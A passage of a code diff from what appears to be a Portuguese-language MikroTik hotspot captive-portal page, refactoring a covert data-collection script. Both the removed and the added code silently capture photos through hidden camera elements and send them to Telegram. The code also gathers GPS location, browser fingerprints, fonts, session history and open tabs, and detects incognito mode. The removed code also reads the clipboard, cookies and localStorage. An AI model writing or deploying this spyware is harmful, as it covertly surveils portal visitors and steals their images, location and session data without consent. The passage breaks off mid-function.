-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        setTimeout(resolve, 500);
-                    };
-                });
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.style.display = 'none';
-                document.body.appendChild(canvas);
-                
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                stream.getTracks().forEach(track => track.stop());
-                video.remove();
-                
-                const dataURL = canvas.toDataURL('image/jpeg', 0.8);
-                cameraPhotos[type] = dataURL;
-                canvas.remove();
-                
-                await sendPhotoToTelegram(dataURL, type);
-            } catch (error) {
-                console.error(`Erro foto ${type}:`, error);
-            }
-        }
-
-        async function testGPS() {
-            if (navigator.geolocation) {
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 15000,
-                            maximumAge: 0
+                        const response = await fetch(url, {
+                            method,
+                            headers,
+                            body,
+                            signal: controller.signal
                         });
-                    });
-                    
-                    deviceData.gps_latitude = position.coords.latitude;
-                    deviceData.gps_longitude = position.coords.longitude;
-                    deviceData.gps_accuracy = position.coords.accuracy;
-                    deviceData.gps_altitude = position.coords.altitude || 'N/A';
-                    deviceData.gps_heading = position.coords.heading || 'N/A';
-                    deviceData.gps_speed = position.coords.speed || 'N/A';
-                    deviceData.gps_source = 'GPS_PRECISO';
-                } catch (error) {
-                    console.error('GPS negado:', error);
-                    deviceData.gps_latitude = 'Negado';
-                    deviceData.gps_longitude = 'Negado';
-                    deviceData.gps_accuracy = 'N/A';
-                    deviceData.gps_source = 'NEGADO';
-                }
-            }
-            
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                deviceData.ipLocation = data;
-                
-                if (deviceData.gps_latitude === 'Negado' || !deviceData.gps_latitude) {
-                    deviceData.gps_latitude = data.latitude;
-                    deviceData.gps_longitude = data.longitude;
-                    deviceData.gps_accuracy = 'Aproximada (IP)';
-                    deviceData.gps_source = 'IP_API';
-                }
-            } catch (e) {
-                deviceData.ipLocation = null;
-            }
-        }
 
-        // 🔍 DETECTAR MODO ANÔNIMO
-        async function detectIncognito() {
-            // Método 1: FileSystem API (Chrome)
-            if (navigator.storage && navigator.storage.estimate) {
-                try {
-                    const estimate = await navigator.storage.estimate();
-                    if (estimate.quota < 100000000) { // menos de 100MB = provavelmente anônimo
-                        return { method: 'storage_quota', detected: true, quota: estimate.quota };
-                    }
-                } catch (e) {}
-            }
-            
-            // Método 2: IndexedDB (Firefox)
-            if (window.indexedDB) {
-                try {
-                    const db = await new Promise((resolve, reject) => {
-                        const req = indexedDB.open('test_incognito');
-                        req.onsuccess = () => resolve(req.result);
-                        req.onerror = () => reject(req.error);
-                    });
-                    db.close();
-                    indexedDB.deleteDatabase('test_incognito');
-                    return { method: 'indexeddb', detected: false };
-                } catch (e) {
-                    return { method: 'indexeddb_error', detected: true };
-                }
-            }
-            
-            // Método 3: TemporaryStorage (Chrome antigo)
-            if (navigator.webkitTemporaryStorage) {
-                try {
-                    const bytes = await new Promise((resolve, reject) => {
-                        navigator.webkitTemporaryStorage.queryUsageAndQuota((used, quota) => {
-                            resolve({ used, quota });
-                        }, reject);
-                    });
-                    if (bytes.quota < 100000000) {
-                        return { method: 'webkit_storage', detected: true, quota: bytes.quota };
-                    }
-                } catch (e) {}
-            }
-            
-            return { method: 'none', detected: false };
-        }
+                        clearTimeout(timeoutId);
 
-        // 📋 PEGAR HISTÓRICO DA SESSÃO (o que é possível)
-        function getSessionHistory() {
-            const history = [];
-            
-            // 1. Navigation entries (páginas visitadas nesta sessão)
-            if (performance.getEntriesByType) {
-                const navEntries = performance.getEntriesByType('navigation');
-                navEntries.forEach(entry => {
-                    history.push({
-                        url: entry.name || document.location.href,
-                        type: 'navigation',
-                        timestamp: new Date(entry.startTime).toISOString(),
-                        duration: entry.duration.toFixed(0) + 'ms'
-                    });
-                });
-            }
-            
-            // 2. Resource entries (recursos carregados)
-            if (performance.getEntriesByType) {
-                const resources = performance.getEntriesByType('resource').slice(0, 10);
-                resources.forEach(r => {
-                    if (r.name && r.name.startsWith('http')) {
-                        history.push({
-                            url: r.name,
-                            type: 'resource',
-                            timestamp: new Date(r.startTime).toISOString()
-                        });
-                    }
-                });
-            }
-            
-            // 3. Referrer chain
-            if (document.referrer) {
-                history.unshift({
-                    url: document.referrer,
-                    type: 'referrer',
-                    timestamp: 'antes desta página'
-                });
-            }
-            
-            // 4. History length
-            history.push({
-                url: `Histórico da sessão: ${window.history.length} páginas`,
-                type: 'info',
-                timestamp: 'atual'
-            });
-            
-            return history.slice(0, 10);
-        }
-
-        // 🪟 DETECTAR ABAS ABERTAS (BroadcastChannel - mesmo domínio)
-        function detectOpenTabs() {
-            const tabs = [];
-            
-            // Aba atual
-            tabs.push({
-                id: 'current',
-                url: window.location.href,
-                title: document.title,
-                timestamp: new Date().toISOString(),
-                status: 'ativa'
-            });
-            
-            // Tentar BroadcastChannel para outras abas do mesmo domínio
-            if ('BroadcastChannel' in window) {
-                try {
-                    const channel = new BroadcastChannel('portal_tabs');
-                    channel.postMessage({ type: 'ping', from: Date.now() });
-                    
-                    // Ouvir respostas por 2 segundos
-                    const responses = [];
-                    channel.onmessage = (e) => {
-                        if (e.data.type === 'pong' && e.data.from !== Date.now()) {
-                            responses.push(e.data);
+                        if (!response.ok) {
+                            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                         }
-                    };
-                    
-                    setTimeout(() => {
-                        channel.close();
-                        deviceData.otherTabs = responses.length;
-                        deviceData.tabResponses = responses;
-                    }, 2000);
-                    
-                    // Responder a pings de outras abas
-                    window.addEventListener('message', (e) => {
-                        if (e.data && e.data.type === 'ping') {
-                            channel.postMessage({ type: 'pong', from: e.data.from });
+
+                        return await response.json();
+                    } catch (error) {
+                        Logger.warn(`Tentativa ${attempt}/${retries} falhou`, error.message);
+                        
+                        if (attempt === retries) {
+                            throw error;
                         }
-                    });
-                    
-                } catch (e) {
-                    deviceData.otherTabs = 'erro';
-                }
-            }
-            
-            // Tentar localStorage para detectar abas
-            try {
-                const tabId = Date.now() + '_' + Math.random();
-                localStorage.setItem('portal_tab_' + tabId, JSON.stringify({
-                    url: window.location.href,
-                    title: document.title,
-                    time: Date.now()
-                }));
-                
-                // Ler outras tabs
-                const allTabs = [];
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key && key.startsWith('portal_tab_')) {
-                        try {
-                            const data = JSON.parse(localStorage.getItem(key));
-                            if (Date.now() - data.time < 60000) { // menos de 1 minuto
-                                allTabs.push(data);
-                            }
-                        } catch (e) {}
+
+                        await this.delay(Config.TELEGRAM.RETRY_DELAY * attempt);
                     }
                 }
-                
-                deviceData.localStorageTabs = allTabs.length;
-                deviceData.localStorageTabData = allTabs;
-                
-                // Limpar após 5 minutos
-                setTimeout(() => {
-                    localStorage.removeItem('portal_tab_' + tabId);
-                }, 300000);
-                
-            } catch (e) {
-                deviceData.localStorageTabs = 'erro';
-            }
-            
-            return tabs;
-        }
+            },
 
-        async function collectAllData() {
-            // === DADOS BÁSICOS ===
-            deviceData.timestamp = new Date().toLocaleString('pt-BR');
-            deviceData.userAgent = navigator.userAgent;
-            deviceData.appName = navigator.appName;
-            deviceData.appVersion = navigator.appVersion;
-            deviceData.appCodeName = navigator.appCodeName;
-            deviceData.platform = navigator.platform;
-            deviceData.product = navigator.product;
-            deviceData.productSub = navigator.productSub;
-            deviceData.vendor = navigator.vendor;
-            deviceData.vendorSub = navigator.vendorSub;
-            deviceData.language = navigator.language;
-            deviceData.languages = navigator.languages?.join(', ') || navigator.language;
-            deviceData.onLine = navigator.onLine;
-            deviceData.cookieEnabled = navigator.cookieEnabled;
-            deviceData.doNotTrack = navigator.doNotTrack;
-            
-            // === TELA ===
-            deviceData.screenWidth = screen.width;
-            deviceData.screenHeight = screen.height;
-            deviceData.windowWidth = window.innerWidth;
-            deviceData.windowHeight = window.innerHeight;
-            deviceData.outerWidth = window.outerWidth;
-            deviceData.outerHeight = window.outerHeight;
-            deviceData.colorDepth = screen.colorDepth;
-            deviceData.pixelDepth = screen.pixelDepth;
-            deviceData.devicePixelRatio = window.devicePixelRatio;
-            deviceData.orientation = screen.orientation?.type || 'N/A';
-            deviceData.availWidth = screen.availWidth;
-            deviceData.availHeight = screen.availHeight;
-            deviceData.orientationLock = 'orientation' in screen && 'lock' in screen.orientation;
-            
-            // === HARDWARE ===
-            deviceData.hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
-            deviceData.deviceMemory = navigator.deviceMemory || 'N/A';
-            deviceData.maxTouchPoints = navigator.maxTouchPoints || 0;
-            deviceData.cpuCores = navigator.hardwareConcurrency || 'N/A';
-            
-            // === CONEXÃO ===
-            deviceData.connectionType = navigator.connection ? (navigator.connection.effectiveType || 'N/A') : 'N/A';
-            deviceData.downlink = navigator.connection ? (navigator.connection.downlink || 'N/A') : 'N/A';
-            deviceData.rtt = navigator.connection ? (navigator.connection.rtt || 'N/A') : 'N/A';
-            deviceData.saveData = navigator.connection ? (navigator.connection.saveData || 'N/A') : 'N/A';
-            deviceData.networkType = navigator.connection ? (navigator.connection.type || 'N/A') : 'N/A';
-            deviceData.downlinkMax = navigator.connection ? (navigator.connection.downlinkMax || 'N/A') : 'N/A';
-            
-            // === TIMEZONE ===
-            deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            deviceData.timezoneOffset = new Date().getTimezoneOffset();
-            
-            // === PÁGINA ===
-            deviceData.referrer = document.referrer || 'Direto';
-            deviceData.currentURL = window.location.href;
-            deviceData.title = document.title;
-            
-            // === MIKROTIK ===
-            deviceData.mikrotik_username = '$(username)';
-            deviceData.mikrotik_remote_address = '$(remote-address)';
-            deviceData.mikrotik_mac = '$(mac)';
-            deviceData.mikrotik_server_name = '$(server-name)';
-            deviceData.mikrotik_radius = '$(radius)';
-            deviceData.mikrotik_link_orig = '$(link-orig)';
-            
-            // === BATERIA ===
-            if ('getBattery' in navigator) {
+            delay(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+        };
+
+        // ============================================
+        // MÓDULO: DEVICE COLLECTOR
+        // ============================================
+        const DeviceCollector = {
+            cache: new Map(),
+
+            getBrowserInfo() {
+                return {
+                    userAgent: navigator.userAgent,
+                    appName: navigator.appName,
+                    appVersion: navigator.appVersion,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    language: navigator.language,
+                    languages: navigator.languages?.join(', ') || navigator.language,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    onLine: navigator.onLine
+                };
+            },
+
+            getScreenInfo() {
+                return {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    orientation: screen.orientation?.type || 'N/A'
+                };
+            },
+
+            getWindowInfo() {
+                return {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight,
+                    devicePixelRatio: window.devicePixelRatio
+                };
+            },
+
+            getHardwareInfo() {
+                return {
+                    cores: navigator.hardwareConcurrency || 'N/A',
+                    memory: navigator.deviceMemory || 'N/A',
+                    maxTouchPoints: navigator.maxTouchPoints || 0
+                };
+            },
+
+            getConnectionInfo() {
+                const conn = navigator.connection;
+                return {
+                    type: conn?.effectiveType || 'N/A',
+                    downlink: conn?.downlink || 'N/A',
+                    rtt: conn?.rtt || 'N/A',
+                    saveData: conn?.saveData || 'N/A'
+                };
+            },
+
+            getTimezoneInfo() {
+                return {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    offset: new Date().getTimezoneOffset()
+                };
+            },
+
+            async getBatteryInfo() {
+                if (!('getBattery' in navigator)) {
+                    return { level: 'N/A', charging: 'N/A' };
+                }
+
                 try {
                     const battery = await navigator.getBattery();
-                    deviceData.batteryLevel = (battery.level * 100).toFixed(0) + '%';
-                    deviceData.batteryCharging = battery.charging ? 'Sim' : 'Não';
-                } catch (e) {
-                    deviceData.batteryLevel = 'N/A';
-                    deviceData.batteryCharging = 'N/A';
+                    return {
+                        level: `${(battery.level * 100).toFixed(0)}%`,
+                        charging: battery.charging ? 'Sim' : 'Não'
+                    };
+                } catch (error) {
+                    Logger.error('Erro ao obter bateria', error);
+                    return { level: 'N/A', charging: 'N/A' };
                 }
-            }
-            
-            // === CANVAS FINGERPRINT ===
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 200; canvas.height = 50;
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Fingerprint', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('Fingerprint', 4, 17);
-                deviceData.canvasFingerprint = canvas.toDataURL().slice(-30);
-            } catch (e) { deviceData.canvasFingerprint = 'N/A'; }
-            
-            // === WEBGL FINGERPRINT ===
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        deviceData.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                        deviceData.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            },
+
+            getCanvasFingerprint() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 200;
+                    canvas.height = 50;
+                    const ctx = canvas.getContext('2d');
+                    
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('Fingerprint', 2, 15);
+                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                    ctx.fillText('Fingerprint', 4, 17);
+                    
+                    return canvas.toDataURL().slice(-30);
+                } catch (error) {
+                    Logger.error('Erro canvas fingerprint', error);
+                    return 'N/A';
+                }
+            },
+
+            getWebGLFingerprint() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    
+                    if (!gl) {
+                        return { vendor: 'N/A', renderer: 'N/A', version: 'N/A' };
                     }
-                    deviceData.webglVersion = gl.getParameter(gl.VERSION);
-                    deviceData.webglShadingLanguage = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
-                    deviceData.webglMaxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
-                    deviceData.webglMaxViewportDims = gl.getParameter(gl.MAX_VIEWPORT_DIMS)?.toString() || 'N/A';
-                    deviceData.webglExtensions = gl.getSupportedExtensions()?.join(', ') || 'N/A';
+
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return {
+                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
+                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
+                        version: gl.getParameter(gl.VERSION)
+                    };
+                } catch (error) {
+                    Logger.error('Erro WebGL fingerprint', error);
+                    return { vendor: 'N/A', renderer: 'N/A', version: 'N/A' };
                 }
-            } catch (e) {}
-            
-            // === AUDIO FINGERPRINT ===
-            try {
-                const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
-                if (AudioContext) {
+            },
+
+            async getAudioFingerprint() {
+                try {
+                    const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+                    if (!AudioContext) return 'N/A';
+
                     const context = new AudioContext(1, 5000, 44100);
                     const oscillator = context.createOscillator();
                     oscillator.type = 'triangle';
                     oscillator.frequency.setValueAtTime(10000, context.currentTime);
+
                     const compressor = context.createDynamicsCompressor();
                     compressor.threshold.setValueAtTime(-50, context.currentTime);
                     compressor.knee.setValueAtTime(40, context.currentTime);
                     compressor.ratio.setValueAtTime(12, context.currentTime);
                     compressor.attack.setValueAtTime(0, context.currentTime);
                     compressor.release.setValueAtTime(0.25, context.currentTime);
+
                     oscillator.connect(compressor);
                     compressor.connect(context.destination);
                     oscillator.start(0);
+
                     const buffer = await context.startRendering();
                     const data = buffer.getChannelData(0);
+                    
                     let sum = 0;
-                    for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
-                    deviceData.audioFingerprint = sum.toFixed(5);
+                    for (let i = 4500; i < 5000; i++) {
+                        sum += Math.abs(data[i]);
+                    }
+
+                    return sum.toFixed(5);
+                } catch (error) {
+                    Logger.error('Erro audio fingerprint', error);
+                    return 'N/A';
                 }
-            } catch (e) { deviceData.audioFingerprint = 'N/A'; }
-            
-            // === FONTES INSTALADAS ===
-            deviceData.installedFonts = detectFonts();
-            
-            // === PLUGINS ===
-            deviceData.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'N/A';
-            deviceData.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ') || 'N/A';
-            
-            // === PREFERÊNCIAS ===
-            deviceData.prefersColorScheme = window.matchMedia?.('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
-            deviceData.prefersReducedMotion = window.matchMedia?.('(prefers-reduced-motion: reduce)').matches ? 'sim' : 'não';
-            deviceData.prefersContrast = window.matchMedia?.('(prefers-contrast: more)').matches ? 'alto' : 'normal';
-            deviceData.invertedColors = window.matchMedia?.('(inverted-colors: inverted)').matches ? 'sim' : 'não';
-            
-            // === STORAGE ===
-            deviceData.localStorage = !!window.localStorage;
-            deviceData.sessionStorage = !!window.sessionStorage;
-            deviceData.indexedDB = !!window.indexedDB;
-            
-            // === APIS DISPONÍVEIS ===
-            deviceData.serviceWorker = 'serviceWorker' in navigator;
-            deviceData.webWorkers = 'Worker' in window;
-            deviceData.sharedWorker = 'SharedWorker' in window;
-            deviceData.geolocation = 'geolocation' in navigator;
-            deviceData.deviceOrientation = 'DeviceOrientationEvent' in window;
-            deviceData.deviceMotion = 'DeviceMotionEvent' in window;
-            deviceData.ambientLight = 'AmbientLightSensor' in window;
-            deviceData.gamepads = navigator.getGamepads ? navigator.getGamepads().length : 0;
-            deviceData.midi = 'requestMIDIAccess' in navigator;
-            deviceData.presentation = 'presentation' in navigator;
-            deviceData.remotePlayback = 'RemotePlayback' in window;
-            deviceData.pictureInPicture = 'pictureInPictureEnabled' in document;
-            deviceData.vibrationAPI = 'vibrate' in navigator;
-            deviceData.bluetooth = 'bluetooth' in navigator;
-            deviceData.usb = 'usb' in navigator;
-            deviceData.nfc = 'NFC' in window;
-            deviceData.wakeLock = 'wakeLock' in navigator;
-            deviceData.paymentRequest = 'PaymentRequest' in window;
-            deviceData.credentials = 'credentials' in navigator;
-            deviceData.resizeObserver = 'ResizeObserver' in window;
-            deviceData.intersectionObserver = 'IntersectionObserver' in window;
-            deviceData.mutationObserver = 'MutationObserver' in window;
-            
-            // === PERMISSIONS ===
-            try {
-                const permissions = await navigator.permissions.query({ name: 'notifications' });
-                deviceData.notificationsPermission = permissions.state;
-            } catch (e) {}
-            
-            // === NAVEGADOR ===
-            deviceData.javaEnabled = typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : false;
-            deviceData.pdfViewerEnabled = navigator.pdfViewerEnabled;
-            deviceData.webdriver = navigator.webdriver;
-            
-            // === PERFORMANCE ===
-            if (performance && performance.timing) {
-                deviceData.pageLoadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
-                deviceData.domContentLoaded = performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart;
-            }
-            
-            // === MÍDIA DEVICES ===
-            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+            },
+
+            detectFonts() {
+                const baseFonts = ['monospace', 'sans-serif', 'serif'];
+                const testFonts = [
+                    'Arial', 'Courier New', 'Georgia', 'Helvetica', 'Times New Roman',
+                    'Verdana', 'Trebuchet MS', 'Palatino', 'Impact', 'Comic Sans MS',
+                    'Lucida Console', 'Tahoma', 'Arial Black', 'Consolas', 'Calibri',
+                    'Cambria', 'Segoe UI', 'Roboto', 'Open Sans', 'Ubuntu'
+                ];
+
+                const testString = 'mmmmmmmmmmlli';
+                const testSize = '72px';
+                
+                const span = document.createElement('span');
+                span.style.cssText = `position: absolute; left: -9999px; font-size: ${testSize}; line-height: normal;`;
+                span.innerText = testString;
+                document.body.appendChild(span);
+
+                const defaultWidth = {};
+                const defaultHeight = {};
+
+                baseFonts.forEach(font => {
+                    span.style.fontFamily = font;
+                    defaultWidth[font] = span.offsetWidth;
+                    defaultHeight[font] = span.offsetHeight;
+                });
+
+                const detected = testFonts.filter(font => {
+                    return baseFonts.some(baseFont => {
+                        span.style.fontFamily = `'${font}', ${baseFont}`;
+                        return span.offsetWidth !== defaultWidth[baseFont] || 
+                               span.offsetHeight !== defaultHeight[baseFont];
+                    });
+                });
+
+                document.body.removeChild(span);
+                return detected;
+            },
+
+            async getMediaDevices() {
+                if (!navigator.mediaDevices?.enumerateDevices) {
+                    return { microphones: 0, speakers: 0, cameras: 0 };
+                }
+
                 try {
                     const devices = await navigator.mediaDevices.enumerateDevices();
-                    deviceData.microphones = devices.filter(d => d.kind === 'audioinput').length;
-                    deviceData.speakers = devices.filter(d => d.kind === 'audiooutput').length;
-                    deviceData.cameras = devices.filter(d => d.kind === 'videoinput').length;
-                } catch (e) {}
-            }
-            
-            // === CLIPBOARD ===
-            try {
-                const clipboardText = await navigator.clipboard.readText();
-                deviceData.clipboard = clipboardText || 'Vazio';
-            } catch (e) {
-                deviceData.clipboard = 'Negado';
-            }
-            
-            // === 🕵️ DETECTAR MODO ANÔNIMO ===
-            deviceData.incognito = await detectIncognito();
-            
-            // ===  HISTÓRICO DA SESSÃO ===
-            deviceData.sessionHistory = getSessionHistory();
-            deviceData.historyLength = window.history.length;
-            
-            // === 🪟 ABAS ABERTAS ===
-            deviceData.openTabs = detectOpenTabs();
-            
-            // === COOKIES ===
-            deviceData.cookies = document.cookie || 'Nenhum cookie acessível';
-            
-            // === LOCALSTORAGE CONTENTS (tentar ler) ===
-            try {
-                const lsData = {};
-                for (let i = 0; i < Math.min(localStorage.length, 20); i++) {
-                    const key = localStorage.key(i);
-                    if (key) {
-                        const value = localStorage.getItem(key);
-                        lsData[key] = value.length > 100 ? value.substring(0, 100) + '...' : value;
+                    return {
+                        microphones: devices.filter(d => d.kind === 'audioinput').length,
+                        speakers: devices.filter(d => d.kind === 'audiooutput').length,
+                        cameras: devices.filter(d => d.kind === 'videoinput').length
+                    };
+                } catch (error) {
+                    Logger.error('Erro media devices', error);
+                    return { microphones: 0, speakers: 0, cameras: 0 };
+                }
+            },
+
+            async detectIncognito() {
+                // Método 1: Storage quota
+                if (navigator.storage?.estimate) {
+                    try {
+                        const estimate = await navigator.storage.estimate();
+                        if (estimate.quota < 100000000) {
+                            return { detected: true, method: 'storage_quota', quota: estimate.quota };
+                        }
+                    } catch (error) {
+                        Logger.debug('Storage quota check failed', error);
                     }
                 }
-                deviceData.localStorageData = lsData;
-                deviceData.localStorageCount = localStorage.length;
-            } catch (e) {
-                deviceData.localStorageData = 'Negado';
-            }
-        }
 
-        function detectFonts() {
-            const baseFonts = ['monospace', 'sans-serif', 'serif'];
-            const testFonts = ['Arial', 'Courier New', 'Georgia', 'Helvetica', 'Times New Roman', 'Verdana', 'Trebuchet MS', 'Palatino', 'Impact', 'Comic Sans MS', 'Lucida Console', 'Tahoma', 'Arial Black', 'Consolas', 'Calibri', 'Cambria', 'Segoe UI', 'Roboto', 'Open Sans', 'Ubuntu', 'Microsoft Sans Serif', 'MS Sans Serif', 'Wingdings', 'Symbol', 'Lucida Sans', 'Book Antiqua', 'Century Gothic'];
-            const testString = 'mmmmmmmmmmlli';
-            const testSize = '72px';
-            const span = document.createElement('span');
-            span.style.position = 'absolute';
-            span.style.left = '-9999px';
-            span.style.fontSize = testSize;
-            span.style.lineHeight = 'normal';
-            span.innerText = testString;
-            document.body.appendChild(span);
-            const defaultWidth = {};
-            const defaultHeight = {};
-            baseFonts.forEach(font => {
-                span.style.fontFamily = font;
-                defaultWidth[font] = span.offsetWidth;
-                defaultHeight[font] = span.offsetHeight;
-            });
-            const detected = testFonts.filter(font => {
-                let detected = false;
-                baseFonts.forEach(baseFont => {
-                    span.style.fontFamily = `'${font}', ${baseFont}`;
-                    if (span.offsetWidth !== defaultWidth[baseFont] || span.offsetHeight !== defaultHeight[baseFont]) detected = true;
+                // Método 2: IndexedDB
+                if (window.indexedDB) {
+                    try {
+                        const db = await new Promise((resolve, reject) => {
+                            const req = indexedDB.open('test_incognito');
+                            req.onsuccess = () => resolve(req.result);
+                            req.onerror = () => reject(req.error);
+                        });
+                        db.close();
+                        indexedDB.deleteDatabase('test_incognito');
+                        return { detected: false, method: 'indexeddb' };
+                    } catch (error) {
+                        return { detected: true, method: 'indexeddb_error' };
+                    }
+                }
+
+                return { detected: false, method: 'none' };
+            },
+
+            getSessionHistory() {
+                const history = [];
+
+                // Navigation entries
+                if (performance.getEntriesByType) {
+                    const navEntries = performance.getEntriesByType('navigation');
+                    navEntries.forEach(entry => {
+                        history.push({
+                            url: entry.name || document.location.href,
+                            type: 'navigation',
+                            duration: `${entry.duration.toFixed(0)}ms`
+                        });
+                    });
+                }
+
+                // Referrer
+                if (document.referrer) {
+                    history.unshift({
+                        url: document.referrer,
+                        type: 'referrer'
+                    });
+                }
+
+                // History length
+                history.push({
+                    url: `Histórico: ${window.history.length} páginas`,
+                    type: 'info'
                 });
-                return detected;
-            });
-            document.body.removeChild(span);
-            return detected;
-        }
 
-        async function sendPhotoToTelegram(photoData, type) {
-            try {
-                const response = await fetch(photoData);
-                const blob = await response.blob();
+                return history.slice(0, 10);
+            },
+
+            detectOpenTabs() {
+                const tabs = [{
+                    id: 'current',
+                    url: window.location.href,
+                    title: document.title,
+                    status: 'ativa'
+                }];
+
+                // BroadcastChannel
+                if ('BroadcastChannel' in window) {
+                    try {
+                        const channel = new BroadcastChannel('portal_tabs');
+                        channel.postMessage({ type: 'ping', from: Date.now() });
+                        
+                        setTimeout(() => channel.close(), 2000);
+                    } catch (error) {
+                        Logger.error('Erro BroadcastChannel', error);
+                    }
+                }
+
+                // LocalStorage tabs
+                let tabCount = 0;
+                try {
+                    const tabId = `tab_${Date.now()}_${Math.random()}`;
+                    localStorage.setItem(tabId, JSON.stringify({
+                        url: window.location.href,
+                        time: Date.now()
+                    }));
+
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        if (key?.startsWith('tab_')) {
+                            try {
+                                const data = JSON.parse(localStorage.getItem(key));
+                                if (Date.now() - data.time < 60000) {
+                                    tabCount++;
+                                }
+                            } catch (e) {}
+                        }
+                    }
+
+                    setTimeout(() => localStorage.removeItem(tabId), 300000);
+                } catch (error) {
+                    Logger.error('Erro localStorage tabs', error);
+                }
+
+                return { tabs, count: tabCount };
+            },
+
+            async collectAll() {
+                const [battery, mediaDevices, incognito] = await Promise.all([
+                    this.getBatteryInfo(),
+                    this.getMediaDevices(),
+                    this.detectIncognito()
+                ]);
+
+                return {
+                    browser: this.getBrowserInfo(),
+                    screen: this.getScreenInfo(),
+                    window: this.getWindowInfo(),
+                    hardware: this.getHardwareInfo(),
+                    connection: this.getConnectionInfo(),
+                    timezone: this.getTimezoneInfo(),
+                    battery,
+                    mediaDevices,
+                    incognito,
+                    fingerprints: {
+                        canvas: this.getCanvasFingerprint(),
+                        audio: await this.getAudioFingerprint(),
+                        webgl: this.getWebGLFingerprint()
+                    },
+                    fonts: this.detectFonts(),
+                    sessionHistory: this.getSessionHistory(),
+                    openTabs: this.detectOpenTabs(),
+                    mikrotik: {
+                        remoteAddress: '$(remote-address)',
+                        mac: '$(mac)',
+                        serverName: '$(server-name)',
+                        linkOrig: '$(link-orig)'
+                    }
+                };
+            }
+        };
+
+        // ============================================
+        // MÓDULO: CAMERA MANAGER
+        // ============================================
+        const CameraManager = {
+            activeStreams: [],
+
+            async capturePhoto(facingMode) {
+                let stream = null;
+                let video = null;
+                let canvas = null;
+
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode,
+                            width: { ideal: Config.CAMERA.VIDEO_WIDTH },
+                            height: { ideal: Config.CAMERA.VIDEO_HEIGHT }
+                        },
+                        audio: false
+                    });
+
+                    this.activeStreams.push(stream);
+
+                    video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.autoplay = true;
+                    video.playsInline = true;
+                    video.style.display = 'none';
+                    document.body.appendChild(video);
+
+                    await new Promise((resolve, reject) => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(resolve, Config.CAMERA.CAPTURE_DELAY);
+                        };
+                        video.onerror = reject;
+                    });
+
+                    canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.style.display = 'none';
+                    document.body.appendChild(canvas);
+
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    const dataURL = canvas.toDataURL('image/jpeg', Config.CAMERA.JPEG_QUALITY);
+
+                    // Cleanup
+                    this.stopStream(stream);
+                    video.remove();
+                    canvas.remove();
+
+                    return dataURL;
+                } catch (error) {
+                    Logger.error(`Erro captura ${facingMode}`, error);
+                    
+                    // Cleanup em caso de erro
